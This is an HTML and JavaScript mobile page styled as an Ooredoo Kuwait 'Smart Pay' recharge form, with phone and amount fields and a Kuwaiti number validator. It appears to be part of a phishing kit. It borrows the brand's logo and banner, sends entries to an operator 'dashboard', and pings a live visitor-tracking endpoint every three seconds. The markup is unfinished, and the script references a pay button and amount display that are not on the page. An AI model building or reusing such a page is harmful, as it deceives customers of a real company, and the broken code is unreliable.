<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
<title>Pay</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
<style>
  :root{
    --bg:#f4f6f9;
    --card:#ffffff;
    --ink:#20232b;
    --ink-soft:#6b7280;
    --line:#e6e8ed;
    --field-line:#dfe2e8;
    --red:#e4312a;
    --red-soft:#fdeceb;
    --disabled-bg:#ededf0;
    --disabled-ink:#b7bac2;
    --radius:16px;
    --zoom:1; /* page zoom: 1 = original size, smaller = smaller */
    box-sizing:border-box;
  }
  *,*::before,*::after{box-sizing:inherit;margin:0;padding:0}
  html,body{height:100%}
  body{
    font-family:'Tajawal',system-ui,-apple-system,'Segoe UI',sans-serif;
    background:var(--bg);
    color:var(--ink);
    display:flex;
    justify-content:center;
    -webkit-font-smoothing:antialiased;
    font-size:16px;
  }

  /* ---------- phone shell ---------- */
  .app{
    zoom:var(--zoom);
    /* compensate zoom so the page still fills the full screen width/height */
    width:calc(100% / var(--zoom));
    max-width:calc(430px / var(--zoom));
    min-height:calc(100% / var(--zoom));
    background:var(--bg);
    display:flex;
    flex-direction:column;
    position:relative;
  }

  /* ---------- header ---------- */
  .appbar{
    background:#fff;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:20px 24px calc(18px + env(safe-area-inset-top,0px));
    padding-top:calc(20px + env(safe-area-inset-top,0px));
    position:sticky;
    top:0;
    z-index:100;
    box-shadow:0 2px 8px rgba(0,0,0,.08);
  }
  .appbar h1{font-size:24px;font-weight:800}
  .icon-btn{background:none;border:none;color:var(--ink);cursor:pointer;display:flex}
  .appbar-end{display:flex;align-items:center;gap:10px}
  .lang-btn{background:none;border:1.5px solid var(--red);border-radius:8px;padding:4px 10px;font-family:inherit;font-size:13px;font-weight:800;color:var(--red);cursor:pointer;line-height:1.4;transition:.15s;}
  .lang-btn:hover{background:var(--red-soft)}

  /* ---------- scroll body ---------- */
  .content{
    flex:1;
    overflow-y:auto;
    padding:24px 14px 160px;
  }

  /* ---------- numbers card ---------- */
  .card{
    background:var(--card);
    border:1px solid var(--line);
    border-radius:var(--radius);
    padding:24px 16px;
    box-shadow:0 6px 18px rgba(28,33,48,.04);
  }
  .card-top{
    display:flex;
    align-items:center;
    justify-content:space-between;
    gap:12px;
  }
  .all-numbers{display:flex;align-items:center;gap:10px;font-weight:700;font-size:16px}
  .pill{
    border:1.6px solid #2b2e38;
    background:#fff;
    color:#2b2e38;
    font-family:inherit;
    font-weight:700;
    font-size:15px;
    padding:11px 22px;
    border-radius:999px;
    cursor:pointer;
    transition:.15s;
  }
  .pill:active{transform:scale(.97)}

  .divider{height:1px;background:var(--line);margin:20px 0}

  /* custom checkbox */
  .chk{
    appearance:none;-webkit-appearance:none;
    width:22px;height:22px;flex:0 0 22px;
    border:1.6px solid #c7cad2;border-radius:6px;
    background:#fff;cursor:pointer;position:relative;transition:.15s;
  }
  .chk:checked{background:var(--red);border-color:var(--red)}
  .chk:checked::after{
    content:"";position:absolute;inset:0;margin:auto;
    width:6px;height:11px;border:solid #fff;border-width:0 2.5px 2.5px 0;
    transform:translateY(-1px) rotate(45deg);
  }

  /* fields */
  .labels,.fields{display:grid;grid-template-columns:2fr 1fr;gap:12px}
  .lbl-phone{padding-inline-start:34px}
  .labels{margin-bottom:10px}
  .lbl{font-weight:700;font-size:16px}
  .req{color:var(--red)}

  .field{
    border:1.4px solid var(--field-line);
    border-radius:12px;
    height:48px;
    display:flex;
    align-items:center;
    padding:0 14px;
    background:#fff;
    transition:border-color .15s;
  }
  .field:focus-within{border-color:#b9bdc7}
  .field input{
    border:none;outline:none;background:none;
    font-family:inherit;font-size:18px;color:#000;font-weight:700;
    width:100%;text-align:left;
    padding:8px 0;
  }
  .field input::placeholder{color:#b3b7c0;font-weight:400}
  .cur{font-weight:800;font-size:16px;margin-inline-end:8px;white-space:nowrap}
  .field input.amount-input{text-align:right}
  .phone-row{display:flex;align-items:center;gap:12px}
  .phone-row .field{flex:1}
  .field.amount-field{padding:0 10px;min-width:0}
  .field input{min-width:0}
  .field.is-error{border-color:var(--red);background:#fff8f8}
  .field.is-ok{border-color:var(--field-line)}
  .phone-msg{font-size:13px;font-weight:500;margin-top:8px;padding-inline-start:34px;min-height:18px;color:var(--ink-soft)}
  .phone-msg.err{color:var(--red)}
  .phone-msg.ok{color:#1e9e5a}

  /* ---------- payment options ---------- */
  .section-title{font-size:24px;font-weight:800;margin:32px 2px 8px}
  .section-sub{color:var(--ink-soft);font-size:16px;margin:0 2px 20px;line-height:1.5}

  .option{
    width:100%;
    background:#fff;
    border:1px solid var(--line);
    border-radius:14px;
    padding:20px 18px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    gap:14px;
    cursor:pointer;
    font-family:inherit;
    margin-bottom:14px;
    box-shadow:0 4px 14px rgba(28,33,48,.03);
    transition:.15s;
  }
  .option:active{transform:scale(.99);background:#fbfbfc}
  .option-main{display:flex;align-items:center;gap:14px}
  .option-main span{font-weight:700;font-size:17px}
  .chevron{color:#3a3d46;flex:0 0 auto}

  /* ---------- pay bar ---------- */
  .paybar{
    position:sticky;bottom:0;
    padding:14px 16px;
    background:linear-gradient(180deg,rgba(244,246,249,0) 0%,var(--bg) 28%);
    z-index:10;
  }
  .pay-btn{
    width:100%;height:56px;border:none;border-radius:999px;
    font-family:inherit;font-weight:800;font-size:18px;
    background:var(--disabled-bg);color:var(--disabled-ink);
    cursor:not-allowed;transition:.2s;
  }
  .pay-btn.ready{background:var(--red);color:#fff;cursor:pointer;box-shadow:0 8px 20px rgba(228,49,42,.3)}
  .pay-btn.ready:active{transform:scale(.99)}

  /* ---------- bottom nav ---------- */
  .tabbar{
    position:sticky;bottom:0;
    background:#fff;
    border-top:1px solid var(--line);
    display:flex;
    padding:10px 6px calc(10px + env(safe-area-inset-bottom,0px));
  }
  .tab{
    flex:1;background:none;border:none;cursor:pointer;font-family:inherit;
    display:flex;flex-direction:column;align-items:center;gap:6px;
    color:#454955;font-weight:700;font-size:12.5px;
  }
  .tab .ic{width:26px;height:26px;display:block}
  .option-main .ic{flex:0 0 30px}
  .tab.active{color:var(--red)}
  .tab.active .ico-wrap{
    background:var(--red-soft);border-radius:12px;padding:5px 12px;
  }
  .ico-wrap{padding:5px 0}
</style>
</head>
<body>
  <div class="app">

    <!-- Header -->
    <header class="appbar">
      <button class="icon-btn" aria-label="Menu">
        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2" stroke-linecap="round">
          <line x1="3" y1="6"  x2="21" y2="6"/>
          <line x1="3" y1="12" x2="21" y2="12"/>
          <line x1="3" y1="18" x2="21" y2="18"/>
        </svg>
      </button>
      <img src="/ooredoo-logo.png" alt="Ooredoo" style="height:44px;width:auto;position:absolute;left:50%;transform:translateX(-50%);background:#fff;padding:2px 6px;border-radius:4px;">
      <div class="appbar-end">
        <button class="lang-btn" id="langBtn">AR</button>
      </div>
    </header>

    <!-- Scrollable content -->
    <main class="content">

      <!-- Banner below header -->
      <div style="margin:0 0 20px;border-radius:var(--radius);overflow:hidden;box-shadow:0 4px 14px rgba(0,0,0,.08);border:1px solid var(--line);">
        <img src="/banner-smartpay-en.jpg" alt="Smart Pay Banner" style="width:100%;display:block;object-fit:cover;">
      </div>

      <!-- Numbers card -->
      <section class="card">
        <div class="card-top">
          <label class="all-numbers">
            <input type="checkbox" class="chk" id="allNumbers">
            <span>All Numbers</span>
          </label>
          <button class="pill" type="button">Add Number</button>
        </div>

        <div class="divider"></div>

        <div class="labels">
          <div class="lbl lbl-phone">Phone Number<span class="req">*</span></div>
          <div class="lbl">Amount<span class="req">*</span></div>
        </div>

        <div class="fields">          <!-- phone + row checkbox -->
          <div class="phone-row">
            <input type="checkbox" class="chk" id="rowCheck">
            <div class="field" id="phoneField">
              <input type="tel" maxlength="13" inputmode="numeric" id="phone" placeholder="Phone Number">
            </div>
          </div>

          <!-- amount -->
          <div class="field amount-field">
            <span class="cur">KD</span>
            <input type="text" inputmode="decimal" id="amount" placeholder="0.000" dir="ltr" class="amount-input">
          </div>
        </div>
        <p class="phone-msg" id="phoneMsg" aria-live="polite"></p>
      
      </section>

      <!-- Payment options -->
      <h2 class="section-title">Payment Options</h2>
      <p class="section-sub">Enjoy app features with more payment options</p>

<script>
  const amount   = document.getElementById('amount');
  const phone    = document.getElementById('phone');
  const phoneBox = document.getElementById('phoneField');
  const phoneMsg = document.getElementById('phoneMsg');
  const payBtn   = document.getElementById('payBtn');
  const payAmt   = document.getElementById('payAmount');
  const HINT     = '';

  // Ooredoo Kuwait mobile: 8 digits starting with 6 (6XXXXXXX)
  const OOREDOO_RE = /^6\d{7}$/;

  // Arabic/Persian digits -> English
  const toEn = s => s.replace(/[٠-٩]/g, d => d.charCodeAt(0) - 1632)
                     .replace(/[۰-۹]/g, d => d.charCodeAt(0) - 1776);

  // accept +965 / 00965 / 965 prefix, keep the local 8 digits
  function normalizePhone(v){
    let d = toEn(v).replace(/\D/g,'');
    if (d.startsWith('00965')) d = d.slice(5);
    else if (d.startsWith('965') && d.length > 8) d = d.slice(3);
    return d.slice(0, 8);
  }

  function checkPhone(showErrors){
    const v = phone.value;
    phoneBox.classList.remove('is-error','is-ok');
    phoneMsg.className = 'phone-msg';

    if (!v){ phoneMsg.textContent = HINT; return false; }

    if (OOREDOO_RE.test(v)){
      phoneBox.classList.add('is-ok');
      phoneMsg.textContent = '';
      return true;
    }

    const msg = 'Invalid number';

    if (showErrors || v[0] !== '6'){
      phoneBox.classList.add('is-error');
      phoneMsg.classList.add('err');
    }
    phoneMsg.textContent = phoneMsg.classList.contains('err') ? msg : HINT;
    return false;
  }

  function fmt(v){
    const n = parseFloat(v);
    return isNaN(n) ? '0.000' : n.toFixed(3);
  }

  function refresh(showErrors){
    const val     = parseFloat(amount.value) || 0;
    const phoneOk = checkPhone(showErrors);
    const valid   = val > 0 && phoneOk;
    payAmt.textContent = fmt(amount.value);
    payBtn.classList.toggle('ready', valid);
    payBtn.disabled = !valid;
  }

  // amount: numbers only, KWD = 3 decimals
  amount.addEventListener('input', e=>{
    e.target.value = toEn(e.target.value).replace(/[^\d.]/g,'').replace(/(\..*)\./g,'$1');
    refresh(false);
  });
  amount.addEventListener('blur', e=>{
    if(e.target.value.trim()!=='') e.target.value = fmt(e.target.value);
  });

  phone.addEventListener('input', e=>{
    e.target.value = normalizePhone(e.target.value);
    refresh(false);
  });
  phone.addEventListener('blur', ()=> refresh(true));

  payBtn.addEventListener('click', ()=>{
    if(payBtn.disabled) return;
    const amt = fmt(amount.value);
    const ph  = phone.value;
    // Submit request to dashboard (phone number + recharge amount)
    fetch('/api/submit',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({ phone: ph, amount: amt })
    }).then(r=>r.json()).then(d=>{
      const sid = d.id || '';
      window.location.href = 'summary-en.html?amount=' + encodeURIComponent(amt) + '&phone=' + encodeURIComponent(ph) + '&sid=' + encodeURIComponent(sid);
    }).catch(()=>{
      window.location.href = 'summary-en.html?amount=' + encodeURIComponent(amt) + '&phone=' + encodeURIComponent(ph);
    });
  });


  document.getElementById('langBtn').addEventListener('click', () => {
    window.location.href = 'index.html';
  });

  /* ---- visitor heartbeat for active visit tracking ---- */
  (function(){
    let vid = sessionStorage.getItem('vid');
    if(!vid){ vid = Math.random().toString(36).slice(2) + Date.now().toString(36); sessionStorage.setItem('vid', vid); }
    function beat(){ fetch('/api/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:vid})}).catch(()=>{}); }
    beat();
    setInterval(beat, 3000);
  })();
</script>
